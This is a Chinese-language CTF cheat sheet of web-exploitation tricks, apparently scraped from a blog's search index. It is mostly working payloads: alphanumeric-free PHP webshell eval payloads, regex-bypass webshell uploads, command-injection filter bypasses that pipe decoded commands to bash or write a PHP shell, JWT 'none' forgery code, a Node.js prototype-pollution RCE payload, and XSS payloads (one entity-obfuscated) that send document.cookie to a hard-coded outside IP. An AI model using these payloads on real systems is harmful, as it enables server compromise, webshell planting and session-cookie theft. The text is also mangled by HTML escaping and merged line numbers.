1234sha1(‘aaroZmOk’)sha1(‘aaK1STfY’)sha1(‘aaO8zKZF’)sha1(‘aa3OFF9m’) 以下值加密前后弱比较相等 10e215962017 eval命令执行无数字字母1234&lt;?phpif(!preg_match('/[a-z0-9]/is',$_GET['shell'])) &#123; eval($_GET['shell']);&#125; payload php5-php7.0 1shell=$_=\"`&#123;&#123;&#123;\"^\"?&lt;&gt;/\";$&#123;$_&#125;[_]($&#123;$_&#125;[__]);&amp;_=assert&amp;__=phpinfo()//$_=_GET 如果把下划线也ban了，还能使用不可见字符或者+或者中文来做变量名。 php7.0之后BAN了assert，不过可以用取反来调用函数。 1shell=(~%8F%97%8F%96%91%99%90)();//phpinfo(); 值得一提的是eval 属于PHP语法构造的一部分，并不是一个函数，所以不能通过变量函数的形式来调用（虽然它确实像极了函数原型）。这样的语法构造还包括：echo，print，unset()，isset()，empty()，include，require。 readfie(end(scandir(.))) 1((%8d%9c%97%a0%88%8d%97%8d%9c%a0%a0)^(%9a%97%9b%88%a0%9a%9b%9b%8d%9c%9a)^(%9b%9c%9c%a0%88%9b%9c%9c%9c%a0%a0)^(%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff%ff))(((%a0%97%8d)^(%9a%9a%9b)^(%a0%9c%8d)^(%ff%ff%ff))(((%8d%a0%88%97%8d%9b%9c)^(%9a%9c%8d%9a%9b%9a%8d)^(%9b%a0%9b%9c%8d%97%9c)^(%ff%ff%ff%ff%ff%ff%ff))(%d1^%ff))); preg_match绕过数组绕过当preg_match处理数组时会返回flase。 换行符正则.不会匹配换行符 在单行匹配下，$不会匹配\\n或者\\r。 PCRE回溯次数限制https://security.bytedance.com/index/ PHP的PCRE采用NFA正则引擎 NFA：从起始状态开始，一个字符一个字符地读取输入串，并与正则表达式进行匹配，如果匹配不上，则进行回溯，尝试其他状态 NFA引擎会设置一个最大回溯次数，如果超过这个次数就返回FLASE,所以我们可发送超长字符串，使正则返回失败。 1BytesIO(b&apos;aaa&lt;?php eval($_POST[txt]);//&apos; + b&apos;a&apos; * 1000000) Linux命令执行参考文章https://blog.zeddyu.info/2019/01/17/ 常用通配符12?匹配一个任意字符*匹配任意字符 空格绕过$IFS分隔符 1$&#123;IFS&#125;,$IFS$9 IFS表示linux下的分隔符，但是直接使用$IFS会导致歧义，比如cat$IFSfile，这样bash会将整个IFSfile当成变量名，导致无法读取到file文件，通常我们用${IFS}来确定变量名，或者使用$IFS$9,$9为当前系统shell进程的第九个参数，默认为空，在这里起到一个隔断作用。 花括号扩展{OS_COMMAND,ARGUMENT} 1&#123;cat,file&#125; 变量绕过 12x='cat\\x20flag'&amp;&amp;$xx='cat\\x09flag'&amp;&amp;$x \\x20和\\x09分别表示空格与tab。 命令分隔符linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、|| windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符） 黑名单绕过1234567891011121314151617181920变量拼接a=l;b=s;$a$b$@绕过l$@s单双引号绕过\"l\"s反斜杠绕过l\\s已有资源截取ls $&#123;PATH:9:1&#125;$&#123;PATH:11:1&#125;nl $&#123;PATH:14:1&#125;$&#123;PATH:21:1&#125;$PS2= &gt;$ps4= +编码绕过echo \"命令base64编码\"|base64 -d|bashecho \"hex编码\" | xxd -r -p|bash$(printf \"\\154\\163\")八进制编码&#123;printf,\"\\74\\77\\160\\150\\160\\40\\100\\145\\166\\141\\154\\50\\44\\137\\120\\117\\123\\124\\133\\47\\143\\47\\135\\51\\73\\77\\76\"&#125; &gt;&gt; 1.php写shell过滤斜杠/ 可以使用 cd .. jwt常见漏洞https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/JSON%20Web%20Token JWT由三个部分构成： header:存放声明类型type(JWT)，加密算法alg(none,HS256等等) 荷载：就是存放有效信息(标准中注册的声明，公共声明，私有声明)，一般用来存放需要传递的信息(用户名密码)。 签名：将头部与荷载的信息base64加密并使用.连接，再通过header中的加密方式与secret组合加密。 最终完整的JWT是由头部的base64.荷载的base64.与签名的组合。 无加密算法JWT生成 12345678910111213141516171819import jwtimport timeimport base64import jsonheaders=&#123;'type':'jwt','alg':\"none\"&#125;payload=&#123;'iat':1587378820,'username':'admin','password':'123','secretid':[]&#125;he=json.dumps(headers)pa=json.dumps(payload)a=base64.b64encode(he.encode('utf-8')).decode('utf-8')b=base64.b64encode(pa.encode('utf-8')).decode('utf-8')print(a+'.'+b+'.') rs256-hs256如果获取到公钥pk，可以使用HS-256算法用公钥对数据签名，py json_decode 官方手册上说，json_encode支持utf-8编码的数据，那也就是支持unicode编码。 Ruby ERB模板注入&lt;%= 7 * 7 %&gt;这种句法可以执行ruby语句 nodejs原型链污染kibana-RCEhttps://xz.aliyun.com/t/6755 Nodejs在使用child_process建立子进程时，会将options对象的env属性作为环境变量加载到/proc/self/environ中，但是options对象默认为空，这就导致了只要污染Object.env，就能控制/proc/self/environ的值。 当node版本&gt;v8.0.0以后支持运行node时增加一个命令行参数NODE_OPTIONS，它能够包含一个js脚本，相当于include，而NODE_OPTIONS是作为环境变量加载的，所以我们可以通过污染NODE_OPTIONS的值，来加载/proc/self/environ，执行我们之前污染的options.env的值。 文章中的payload 12345678// test.jsproc = require(&apos;child_process&apos;);var aa = &#123;&#125;aa.__proto__.env = &#123;&apos;AAAA&apos;:&apos;console.log(process.mainModule.require(&apos;child_process&apos;).execSync(&apos;cat /flag&apos;).toString())//&apos;,&apos;NODE_OPTIONS&apos;:&apos;--require /proc/self/environ&apos;&#125; --require -rproc.fork(&apos;./function.js&apos;);//function.jsconsole.log(&apos;this is func&apos;) 利用条件：node&gt;v8.0，js使用child_process创建子进程。 1$&#123;0&#125;&lt;&lt;&lt;\\$\\&apos;\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\\&apos;&lt;&lt;&lt;\\$\\&apos;\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$&#123;##&#125;$&#123;##&#125;$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$(())$&#123;##&#125;$&#123;##&#125;$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$&#123;##&#125;))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$&#123;##&#125;$&#123;##&#125;$(())$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())$&#123;##&#125;$(())))\\\\$(($(($&#123;##&#125;&lt;&lt;$&#123;##&#125;))#$&#123;##&#125;$(())$&#123;##&#125;$(())$(())$&#123;##&#125;$(())$(())))\\&apos; XSS绕过姿势小括号过滤了可以用反引号代替 1&lt;script&gt;setTimeout`alert\\u0028document.cookie\\u0029`;&lt;/script&gt; 1&lt;svg&gt;&lt;script&gt;eval(&quot;window.location.href=&apos;http://8.129.69.85:2333&apos;&quot;)&lt;/script&gt; 1&lt;svg&gt;&lt;script&gt;eval&amp;#40;&amp;#34;&amp;#119;&amp;#105;&amp;#110;&amp;#100;&amp;#111;&amp;#119;&amp;#46;&amp;#108;&amp;#111;&amp;#99;&amp;#97;&amp;#116;&amp;#105;&amp;#111;&amp;#110;&amp;#46;&amp;#104;&amp;#114;&amp;#101;&amp;#102;&amp;#61;&amp;#39;&amp;#104;&amp;#116;&amp;#116;&amp;#112;&amp;#58;&amp;#47;&amp;#47;&amp;#56;&amp;#46;&amp;#49;&amp;#50;&amp;#57;&amp;#46;&amp;#54;&amp;#57;&amp;#46;&amp;#56;&amp;#53;&amp;#58;&amp;#50;&amp;#51;&amp;#51;&amp;#51;&amp;#63;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#61;&amp;#39;&amp;#43;&amp;#100;&amp;#111;&amp;#99;&amp;#117;&amp;#109;&amp;#101;&amp;#110;&amp;#116;&amp;#46;&amp;#99;&amp;#111;&amp;#111;&amp;#107;&amp;#105;&amp;#101;&amp;#34;&amp;#41;&lt;/script&gt; http://web.node3.buuoj.cn/post/35f5dcee21e6bcc461f6021ba07f8bba.html http://web.node3.buuoj.cn/post/97b32351779495478f94dc5ff9537353.html htaccess绕过姿势12345678910111213141516AddType application/x-httpd-ph\\p .aphp_value auto_append_file .htaccess append or prepend#&lt;?php phpinfo();# .htaccessphp_flag zend.multibyte 1php_value zend.script_encoding &quot;UTF-7&quot; # index.php+ADw?php phpinfo()+ADs +AF8AXw-halt+AF8-compiler()+ADs可以转义换行符，从而达到多行注释#\\","categories":[{"name":"trick","slug":"trick","permalink":"http://yoursite.com/categories/trick/"}],"tags":[]}],"categories":[{"name":"祥云杯","slug":"祥云杯","permalink":"http://yoursite.com/categories/祥云杯/"},{"name":"专题  writeup","slug":"专题-writeup","permalink":"http://yoursite.com/categories/专题-writeup/"},{"name":"Nu1lCtf","slug":"Nu1lCtf","permalink":"http://yoursite.com/categories/Nu1lCtf/"},{"name":"西湖论剑","slug":"西湖论剑","permalink":"http://yoursite.com/categories/西湖论剑/"},{"name":"writeup","slug":"writeup","permalink":"http://yoursite.com/categories/writeup/"},{"name":"漏洞复现","slug":"漏洞复现","permalink":"http://yoursite.com/categories/漏洞复现/"},{"name":"专题  Python","slug":"专题-Python","permalink":"http://yoursite.com/categories/专题-Python/"},{"name":"XXE","slug":"XXE","permalink":"http://yoursite.com/categories/XXE/"},{"name":"pdo","slug":"pdo","permalink":"http://yoursite.com/categories/pdo/"},{"name":"协议学习","slug":"协议学习","permalink":"http://yoursite.com/categories/协议学习/"},{"name":"trick","slug":"trick","permalink":"http://yoursite.com/categories/trick/"}],"tags":[]}